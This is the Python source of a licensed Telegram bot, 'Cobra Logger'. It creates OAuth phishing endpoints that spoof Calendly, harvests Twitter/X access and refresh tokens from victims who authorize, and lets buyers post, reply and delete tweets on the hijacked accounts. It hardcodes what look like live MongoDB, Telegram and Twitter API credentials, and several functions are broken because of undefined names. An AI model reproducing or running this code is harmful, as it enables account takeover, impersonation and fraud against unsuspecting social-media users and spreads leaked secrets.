import random
import string
import requests
import urllib.parse
import base64
import validators
import uuid
from datetime import datetime, timedelta
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive
keep_alive()

MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"
TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
TWITTER_CLIENT_ID = 'eWNUdkx4LTnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'

credentials = 'ZVdOVWRreDRMVGxuYUdRME4zQmFTR0p5WWtVNk1UcGphUTo0Y2N0XzRkWjNCVnpfTU5LS2pheldpMU0zWFZlbG5TaUdxVjZSNWhCeEMtUGJqN3l0bg=='

client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
db = client['cobra_db']
users = db['users']
groups = db['groups']
licenses = db['licenses']
templates = db['templates']

parse_mode = "MarkDown"

try:
    client.admin.command('ping')
    print("[+] MongoDB has successfully connected.")
except Exception as e:
    print("[-] MongoDB has failed connecting.")
    print(e)

def generate_random_key(length=12, segment_length=4):
    characters = string.ascii_uppercase + string.digits  # Use uppercase letters and digits
    key = ''.join(random.choice(characters) for _ in range(length))
    
    segments = [key[i:i+segment_length] for i in range(0, len(key), segment_length)]
    
    return '-'.join(segments)
    
async def check_license(user_id, chat_id, context):
    group = groups.find_one({"group_id": chat_id})
    
    if group:
        text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
        
        license = licenses.find_one({"used_by": group.get("owner_id"), "status": "active"})
        if not license:
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
        
        expiration_date = license.get("expiration_date")
        if expiration_date and datetime.utcnow() > expiration_date:
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
            
        return True
    else:
        text = "⚠️ *Group is not setup for OAuth.*\n\n💬 _Use the_ *_/setup_* _command to setup your group for OAuth._"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return False


async def start(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if context.args == None:
        return
        
    key = context.args[0]
    
    license = licenses.find_one({"key": key, "used_by": None})
    if not license:
        text="❌ *The license key you provided is invalid.*"
        
        await context.bot.send_message(chat_id, text, parse_mode)
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if licenses.find_one({"used_by": user_id}):
        text="⚠️ *A license is already active on your account.*"
        
        await context.bot.send_message(chat_id, text, parse_mode)
        return
        
    user_data = {
        "user_id": user_id,
        "username": username,
        "group_id": None
    }
    users.insert_one(user_data)
    
    license_data = {
        "used_by": user_id,
    }
    result = licenses.update_one(
        {"key": key},
        {"$set": license_data}
    )
    
    if result.modified_count > 0:
        expiration_date = license.get("expiration_date")
        expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Never"
        
        text = f"🐍 *Welcome to Cobra Logger, _{update.effective_user.full_name}_*! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_msg}`\n\n💬 _To get started, add me to a group and use the_ *_/setup_* command to setup your group for OAuth._"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occured.*"
        await context.bot.send_message(chat_id, text, parse_mode)


async def help(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    text = "❔ *List of Commands*\n\n *•* 🐦 */post_tweet* <username> <message> - Posts a tweet on behalf of the user.\n *•* 💬 */post_reply* <username> <tweetId> <message> - Posts a reply to a tweet on behalf of the user.\n *•* ❌ */delete_tweet* <username> <tweetId> - Deletes a tweet on behalf of the user.\n *•* 👥 */display_users* - Shows the list of authenticated users.\n *•* 🔗 */display_endpoint* - Displays the group's endpoint.\n *•* 🔄 */set_redirect* - Sets the redirect upon authorization.\n *•* ❔ */help* - Displays the list of commands."
    await context.bot.send_message(chat_id, text, parse_mode)


async def setup(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
            
    owner_id = update.message.from_user.id
    owner_username = update.message.from_user.username
    group_name = update.message.chat.title
    identifier = str(uuid.uuid4())
    
    license = licenses.find_one({"used_by": owner_id, "status": "active"})
    if not license:
        text = "⚠️ *License not found. Please purchase a license to continue using Cobra Logger.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
        
    expiration_date = license.get("expiration_date")
    if expiration_date and datetime.utcnow() > expiration_date:
        text = "⚠️ *License has expired. Please purchase a license to continue using Cobra Logger.*"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    if license:
        group_data = {
            "group_id": chat_id,
            "group_name": group_name,
            "owner_id": owner_id,
            "owner_username": owner_username,
            "identifier": identifier,
            "redirect": "https://calendly.com/cointele",
            "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
            "authenticated_users": [],
            "template": {
                "name": "Calendly",
                "spoof": "https://calendly.com/cointele"
            }
        }
        groups.insert_one(group_data)
        
        user_data = {
            "group_id": chat_id
        }
        result = users.update_one(
            {"user_id": owner_id},
            {"$set": user_data}
        )
        
        if result.modified_count > 0:
            text = f"✅ *Group successfully setup for OAuth.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {group_data['group_id']}\n┣  *Group Name:* {group_data['group_name']}\n┣  *Owner: @{group_data['owner_username']}*\n╰  *Identifier:* {group_data['identifier']}\n\n💬 _Use the /help command to get the list of available commands._"
            await context.bot.send_message(chat_id, text, parse_mode)
        else:
            text = "⚠️ *An unknown error has occured.*"
            await context.bot.send_message(chat_id, text, parse_mode)


async def set_redirect(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            'Usage: /set_redirect <url>')
        return
        
    url = args[0]
    
    if not validators.url(url):
        text = "⚠️ *The URL you provided is invalid.*"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        group_data = {
            "redirect": url
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        text = f"✅ *Redirect URL for this group successfully set to {url}.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        
        
async def display_endpoint(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        text = f"🔗 *Endpoint: {group.get('endpoint')}*"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occured.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        

async def post_tweet(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    parse_mode = "MarkdownV2"
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /post_tweet <username> <message>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        return await send_warning(context, chat_id, "unknown")

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        return await send_warning(context, chat_id, f"User _{username}_ has not authorized with OAuth\\.")
        
    message = ' '.join(arg.strip()
                          for arg in args[1:]).replace('\\n', '\n')
    access_token, refresh_token, username = user["access_token"], user["refresh_token"], user["username"]

    res, r = tweet(access_token, message)
    if res.status_code == 201:
        return await handle_successful_tweet(context, chat_id, username, r)
    elif res.status_code == 401:
        url = 'https://api.twitter.com/2/oauth2/token'
        data = {
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token,
            'client_id': TWITTER_CLIENT_ID,
            'client_secret': TWITTER_CLIENT_SECRET
        }
        headers = {
            'Authorization': f'Basic {credentials}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        await context.bot.send_message(chat_id=chat_id, text=f"{headers}")
        
        try:
            res = requests.post(url=url, data=data, headers=headers)
            r = res.json()
            
            await context.bot.send_message(chat_id=chat_id, text=f"{r}")
            
            new_access_token = r["access_token"]
            new_refresh_token = r.get("refresh_token", refresh_token)
            
            await context.bot.send_message(chat_id=chat_id, text=f"{new_access_token}\n{new_refresh_token}")
            
            groups.update_one(
                    {"group_id": chat_id, "authenticated_users.username": username}, 
                    {"$set": {
                        "authenticated_users.$.access_token": new_access_token,
                        "authenticated_users.$.refresh_token": new_refresh_token
                    }}
                )
                
            res, r = tweet(new_access_token, message)
            
            if res.status_code == 201:
                return await handle_successful_tweet(context, chat_id, username, r)
            else:
                text = f"🚫 Failed to post tweet. Error code: {res.status_code}\n{r}"
                await context.bot.send_message(chat_id, text, parse_mode)
        except Exception as e:
            text = f"❌ *User* *[{username}](https://x\\.com/{username})* *revoked OAuth access and is no longer valid\\.*"
            await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = f"Error code: {res.status_code}\n{r}"
        await context.bot.send_message(chat_id, text)


async def reply(update: Update, context: CallbackContext) -> None:
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
        
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            'Usage: /post_reply {accessToken} {tweetId} {text}')
        return

    access_token = args[0]
    tweet_id = args[1]
    tweet_text = ' '.join(arg.strip()
                          for arg in args[2:]).replace('\\\\n', '\n')

    tweet_url = 'https://api.twitter.com/2/tweets'
    user_lookup_url = 'https://api.twitter.com/2/users/me'

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    response = requests.get(user_lookup_url, headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    tweet_data = {
        'text': tweet_text,
        'reply': {
            'in_reply_to_tweet_id': tweet_id,
        }
    }
    response = requests.post(tweet_url, json=tweet_data, headers=headers)
    response_data = response.json()

    tweetId = response_data['data']['id']
    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 201:
        await context.bot.send_message(
            chat_id=chatId,
            text=
            f'✅ *Reply Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
            parse_mode=parse_mode)
    else:
        await context.bot.send_message(
            chat_id=chatId,
            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')


async def delete(update: Update, context: CallbackContext) -> None:
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /delete_tweet {accessToken} {id}')
        return

    access_token = args[0]
    tweetId = args[1]

    delete_url = f'https://api.twitter.com/2/tweets/{tweetId}'
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    response = requests.delete(delete_url, headers=headers)
    response_data = response.json()

    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 200:
        await context.bot.send_message(chat_id=chatId,
                                       text='❌ Tweet Deleted ❌')
    else:
        print(response_data)
        await update.message.reply_text(
            f'🚫 Deletion Failed 🚫\nError: {response_data["title"]}')

async def generate_key(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if update.message.from_user.id != 5074337318: return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /generate_key <expiration>, e.g., /generate_key 1d, 7d, 1m, 1y, lifetime")
        return

    expiration = context.args[0]
    key = generate_random_key()
    expiration_date = None

    if expiration == '1d':
        expiration_date = datetime.now() + timedelta(days=1)
    elif expiration == '7d':
        expiration_date = datetime.now() + timedelta(days=7)
    elif expiration == '1m':
        expiration_date = datetime.now() + timedelta(days=30)
    elif expiration == 'lifetime':
        expiration_date = None
    else:
        await update.message.reply_text("Invalid expiration format. Use 1d, 7d, 1m, 1y, or lifetime.")
        return

    license_data = {
        "key": key,
        "used_by": None,
        "status": "active",
        "expiration_date": expiration_date
    }
    licenses.insert_one(license_data)

    expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Lifetime"
    await context.bot.send_message(chat_id=chat_id, text=f"☑️ *License Generated*\n\n🔗 *Link*\n*https://t.me/uaODw8xjIam_bot?start={key}*\n📅 *Expiration*\n`{expiration_msg}`", parse_mode=parse_mode)
    
    
def get_chat_id(update: Update) -> int:
    return update.message.chat_id if update.message else update.callback_query.message.chat_id
    
    
def tweet(token: str, message: str) -> tuple:
    url = 'https://api.x.com/2/tweets'
    json_data = {'text': message, 'reply_settings': "mentionedUsers"}
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    res = requests.post(url, json=json_data, headers=headers)
    return res, res.json()


async def handle_successful_tweet(context: CallbackContext, chat_id: int, username: str, response: dict) -> None:
    tweet_id = response['data']['id']
    text = f"✅ *Tweet successfully posted by user* *[{username}](https://x\\.com/{username})**\\.*\n" \
        f"🐦 *Tweet ID:* `{tweet_id}`\n" \
        f"🔗 __*[View tweet](https://x\\.com/{username}/status/{tweet_id})*__\n\n" \
        f"💬 _Replies for this tweet are restricted to mentioned only\\. To enable replies, use the command_ *_/set\\_replies_*_\\._"
    parse_mode = "MarkdownV2"
    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def handle_generic_error(context: CallbackContext, chat_id: int, res: requests.Response, response: dict) -> None:
    if res.status_code == 403 and 'detail' in response and 'duplicate content' in response['detail']:
        text = "❌ *Tweet failed to post.*\n" \
               "⚠️ *Reason:* Duplicate content detected. You cannot post the same tweet multiple times."
    else:
        text = f"❌ *Failed to post tweet.*\n" \
               f"⚠️ *Error code:* {res.status_code}\n" \
               f"🛑 *Details:* {response.get('detail', 'Unknown error')}"

    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def send_warning(context: CallbackContext, chat_id: int, message: str) -> None:
    text = f"⚠️ *{'An unknown error has occurred\\.' if message == 'unknown' else message}*"
    parse_mode = "MarkdownV2"
    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def send_error(context: CallbackContext, chat_id: int, message: str) -> None:
    text = f"❌ *{message}*"
    parse_mode = "MarkdownV2"
    await context.bot.send_message(chat_id, text, parse_mode)
    

def main() -> None:
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("post_tweet", post_tweet))
    app.add_handler(CommandHandler("post_reply", reply))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("refresh", refresh))
    app.add_handler(CommandHandler("delete_tweet", delete))
    app.add_handler(CommandHandler("generate_key", generate_key))
    app.add_handler(CommandHandler("set_redirect", set_redirect))
    app.add_handler(CommandHandler("display_endpoint", display_endpoint))
    app.run_polling(poll_interval=5)


if __name__ == '__main__':
    main()
